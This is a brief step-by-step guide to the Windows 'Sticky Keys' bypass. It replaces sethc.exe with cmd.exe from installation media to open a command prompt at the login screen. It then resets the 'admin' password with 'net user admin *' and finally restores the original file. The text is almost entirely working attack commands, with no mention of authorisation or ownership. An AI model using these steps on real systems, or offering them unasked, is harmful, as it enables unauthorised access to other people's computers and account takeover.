 Sticky Keys Method (sethc.exe)
 
 📝 Description:
  By replacing Sticky Keys executable (sethc.exe) with cmd.exe, you can launch CMD from the login screen by pressing Shift 5 times.
  
🧰 Steps:

    Boot using Windows installation media and open CMD (Shift + F10).

    Backup original Sticky Keys binary:

copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.bak

Replace it with CMD:

copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe /y

Reboot. On login screen, press Shift 5 times.

CMD opens. Reset the password:

net user admin *

Restore sethc.exe after access:

copy C:\Windows\System32\sethc.bak C:\Windows\System32\sethc.exe /y
